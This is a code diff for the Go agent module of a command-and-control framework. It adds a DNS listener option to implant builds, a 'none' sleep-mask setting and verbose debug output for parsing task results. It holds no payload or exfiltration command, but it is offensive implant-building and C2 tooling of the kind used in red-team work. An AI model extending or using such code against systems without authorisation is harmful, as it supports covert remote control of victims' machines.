@@ -69,22 +69,31 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		return nil, "", fmt.Errorf("failed to parse agentConfig: %v", err)
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
-	if err != nil {
-		fmt.Printf("ERROR: failed decode base64: %v\n", err)
-		return nil, "", err
+	// Detect listener protocol
+	listenerProtocol := ""
+	if p, ok := listenerMap["protocol"].(string); ok {
+		listenerProtocol = p
 	}
-	malleable_str := string(decoded)
-	fmt.Printf("DEBUG: Malleable profile decoded (%d bytes)\n", len(malleable_str))
 
-	// Build malleable HTTP bytes
-	malleableBytes, callbackCount, err := BuildMalleableHTTPBytes(malleable_str)
-	if err != nil {
-		fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
-		return nil, "", err
+	var malleableBytes []byte
+	var callbackCount int
+
+	if listenerProtocol != "dns" {
+		decoded, err := base64.StdEncoding.DecodeString(fmt.Sprint(listenerMap["uploaded_file"]))
+		if err != nil {
+			fmt.Printf("ERROR: failed decode base64: %v\n", err)
+			return nil, "", err
+		}
+		malleable_str := string(decoded)
+
+		malleableBytes, callbackCount, err = BuildMalleableHTTPBytes(malleable_str)
+		if err != nil {
+			fmt.Printf("ERROR: Failed to build malleable HTTP bytes: %v\n", err)
+			return nil, "", err
+		}
+	} else {
+		fmt.Println("DEBUG: DNS protocol - skipping malleable profile")
 	}
-	fmt.Printf("DEBUG: Malleable bytes generated (%d bytes)\n", len(malleableBytes))
-	fmt.Printf("DEBUG: HTTP Callback count: %d\n", callbackCount)
 
 	// Get working directory
 	wd, err := os.Getwd()
@@ -270,9 +279,19 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 
 		fmt.Sprintf("KH_BOF_HOOK_ENABLED=%d", bool_to_int(cfg.BofApiProxy)),
 
-		// Malleable HTTP bytes como array C entre aspas
+		// Malleable HTTP bytes
 		fmt.Sprintf("HTTP_MALLEABLE_BYTES=\"%s\"", bytes_to_hexstr(malleableBytes)),
 		fmt.Sprintf("HTTP_CALLBACK_COUNT=%d", callbackCount),
+	}
+
+	// DNS-specific variables
+	if listenerProtocol == "dns" {
+		makeVars = append(makeVars, "PROFILE_C2=0x35")
+		dnsDomain := ""
+		if d, ok := listenerMap["domain"].(string); ok {
+			dnsDomain = d
+		}
+		makeVars = append(makeVars, fmt.Sprintf("DNS_DOMAIN=%s", dnsDomain))
 	}
 
 	// Guardrails
@@ -332,6 +351,8 @@ func AgentGenerateBuild(agentConfig string, agentProfile []byte, listenerMap map
 		makeVars = append(makeVars, "KH_SLEEP_MASK=1")
 	case "pooling":
 		makeVars = append(makeVars, "KH_SLEEP_MASK=2")
+	case "none", "":
+		makeVars = append(makeVars, "KH_SLEEP_MASK=0")
 	default:
 		makeVars = append(makeVars, "KH_SLEEP_MASK=3")
 	}
@@ -619,9 +640,7 @@ func CreateAgent(initialData []byte) (ax.AgentData, ax.ExtenderAgent, error) {
 
 	khcfg.Session.AgentIdStr = string(packer.ParsePad(36))
 	agentId := fmt.Sprintf("%08x", rand.Uint32())
-	fmt.Printf("Agent ID: %s\n", agentId)
 	fmt.Printf("Agent Random UUID: %s\n", khcfg.Session.AgentIdStr)
-
 	khcfg.Session.AgentIdStr = agentId
 
 	khcfg.Machine.OsArch = packer.ParseInt8()
@@ -1923,29 +1942,36 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 
 	packer := CreatePacker(packedData)
 
-	// Print packedData
-	// fmt.Printf("=== PACKED DATA DEBUG ===\n")
-	// fmt.Printf("Total bytes: %d\n", len(packedData))
-	// fmt.Printf("Hex dump:\n%s", hex.Dump(packedData))
-	// fmt.Printf("Raw hex: %x\n", packedData)
-	// fmt.Printf("========================\n\n")
+	fmt.Printf("=== ProcessTasksResult ===\n")
+	fmt.Printf("Total bytes: %d\n", len(packedData))
+	if len(packedData) < 200 {
+		fmt.Printf("Hex: %x\n", packedData)
+	} else {
+		fmt.Printf("Hex (first 200): %x\n", packedData[:200])
+	}
 
 	if false == packer.CheckPacker([]string{"int"}) {
+		fmt.Printf("FAIL: CheckPacker int failed\n")
 		return outTasks
 	}
 
 	taskCount := packer.ParseInt32()
+	fmt.Printf("taskCount=%d\n", taskCount)
 
 	for taskIndex := uint(0); taskIndex < taskCount && packer.CheckPacker([]string{"int"}); taskIndex++ {
 		dataType := packer.ParseInt32()
 
 		if dataType == uint(MSG_QUICK) || dataType == uint(MSG_OUT) {
+			fmt.Printf("  dataType=%d (MSG_QUICK=%d MSG_OUT=%d) remaining=%d\n", dataType, MSG_QUICK, MSG_OUT, len(packer.buffer))
 			if len(packer.buffer) < 16 {
+				fmt.Printf("  FAIL: buffer < 16\n")
 				return outTasks
 			}
 
 			TaskUID := string(packer.ParsePad(36))
+			fmt.Printf("  TaskUID=%q (len=%d)\n", TaskUID[:min(len(TaskUID),16)], len(TaskUID))
 			if len(TaskUID) < 8 {
+				fmt.Printf("  FAIL: TaskUID < 8\n")
 				return outTasks
 			}
 			task := taskData
@@ -1960,6 +1986,7 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 			}
 
 			outputType := packer.ParseInt32()
+			fmt.Printf("  outputType=%d taskId=%s remaining=%d\n", outputType, task.TaskId, len(packer.buffer))
 
 			switch outputType {
 			case CALLBACK_ERROR:
@@ -2038,10 +2065,10 @@ func ProcessTasksResult(ts Teamserver, agentData ax.AgentData, taskData ax.TaskD
 				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
 			}
 
-			task.Completed = false
+			task.Completed = true
 			outTasks = append(outTasks, task)
 
-		} else if dataType == uint(PROFILE_WEB) || dataType == uint(PROFILE_SMB) { // web || smb
+		} else if dataType == uint(PROFILE_WEB) || dataType == uint(PROFILE_SMB) || dataType == 0x35 { // web || smb || dns
 
 			if false == packer.CheckPacker([]string{"array"}) {
 				return outTasks
